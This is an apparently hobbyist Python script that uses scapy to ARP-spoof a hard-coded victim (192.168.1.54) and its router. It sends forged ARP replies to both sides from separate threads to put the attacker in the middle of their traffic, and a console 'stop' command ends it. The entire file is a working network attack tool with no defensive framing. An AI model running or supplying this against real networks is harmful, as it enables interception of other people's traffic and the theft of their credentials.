# !/usr/bin/env python
import sys

sys.stderr = None

import scapy.all as scapy
import threading
import time

# define global variables
TARGET_IP = "192.168.1.54"
ROUTER_IP = "192.168.1.1"




class ARPspoof:
    def __init__(self, target, router):

        """
        DOCSTRING: this function initalizes the APR spoof class
        target:    this is the IP address of the victim (a string)
        router:    this is the IP address of the router (a string)
        """

        self.target = str(target)
        self.router = str(router)

        self.__terminate = False

    def request_mac(self, ip):

        """
        DOCSTRING: this function will create a ARP request to broadcast ans ask the MAC address of a given IP
        ip:        ip is the IP address of the machine which we need the MAC (a string)
        return:    the mac address of the machine (a string)
        """
        # create a ARP packet using scapy
        arp_packet = scapy.ARP(pdst = ip) # creating a arp request to ask the mac of a ip
        broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")

        arp_req_broadcast =  broadcast / arp_packet
        answers = scapy.srp(arp_req_broadcast, timeout = 1, verbose = False)[0]

        return answers[0][1].hwsrc

    def send_arp_packet(self, target, source, single = True,  sleep = 1):

        """
        DOCSTRING: this function will create and send an ARP response to spoof one side (single side)
        target:    the ip of the target (a string)
        source:    the ip of the source (a string)
        """

        packet = scapy.ARP(
            op    = 2,                     # we need to create a ARP response, not a request
            pdst  = target,                # the ip address of the victims machine
            hwdst = self.request_mac(target),   # the mac address of the victims machine
            psrc  = source                 # the ip address of the router
        )

        while (not single) and (not self.__terminate):
            scapy.send(packet)     # send the created packet to the network
            print(f"ARP response sent from {source} to {target}")
            time.sleep(sleep)

        else:
            scapy.send(packet)     # send the packet once

    
    def __main_input(self):

        """
        DOCSTRING: this function will get inputs from the command line and execute commands
        """

        data_input = input().strip()

        if data_input == "stop":
            self.__terminate = True

    
    def run(self):

        self.__terminate = False      # set terminate to false to restart the spoofing
        router_spoof = threading.Thread(target=self.send_arp_packet, args=(self.router, self.target))
        target_spoof = threading.Thread(target=self.send_arp_packet, args=(self.target, self.router))
        input_thread = threading.Thread(target=self.__main_input)

        router_spoof.start()
        target_spoof.start()
        input_thread.start()

        router_spoof.join()
        target_spoof.join()
        input_thread.join()







arp_spoofer = ARPspoof(TARGET_IP, ROUTER_IP)
arp_spoofer.run()